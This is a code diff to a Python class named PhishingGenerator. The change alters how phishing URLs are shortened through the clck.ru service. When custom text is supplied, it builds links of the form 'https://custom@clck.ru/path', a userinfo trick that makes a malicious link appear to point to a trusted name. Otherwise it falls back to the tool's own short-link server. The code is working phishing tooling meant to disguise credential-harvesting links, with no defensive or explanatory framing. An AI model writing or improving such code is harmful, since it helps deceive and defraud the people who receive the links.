@@ -1538,23 +1538,23 @@ class PhishingGenerator:
             custom = custom_text or ''
             if custom:
                 custom = custom.replace(' ', '')
-                self.short_links[custom] = phish_url
-                shortened_url = f"{self.server_url}/s/{custom}"
-            else:
-                try:
-                    r = requests.get(f"https://clck.ru/--?url={quote(phish_url, safe='')}", timeout=8)
-                    s = r.text.strip()
-                    if r.status_code == 200 and s.startswith('https://clck.ru/'):
-                        path = s.split('/')[-1]
-                        shortened_url = f"https://clck.ru/{path}"
+            try:
+                r = requests.get(f"https://clck.ru/--?url={quote(phish_url, safe='')}", timeout=8)
+                s = r.text.strip()
+                if r.status_code == 200 and s.startswith('https://clck.ru/'):
+                    path = s.split('/')[-1]
+                    if custom:
+                        shortened_url = f"https://{custom}@clck.ru/{path}"
                     else:
-                        sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-                        self.short_links[sc] = phish_url
-                        shortened_url = f"{self.server_url}/s/{sc}"
-                except:
+                        shortened_url = f"https://clck.ru/{path}"
+                else:
                     sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                     self.short_links[sc] = phish_url
                     shortened_url = f"{self.server_url}/s/{sc}"
+            except:
+                sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+                self.short_links[sc] = phish_url
+                shortened_url = f"{self.server_url}/s/{sc}"
             
             sep = "─" * 40
             console.print(f"\n{sep}")
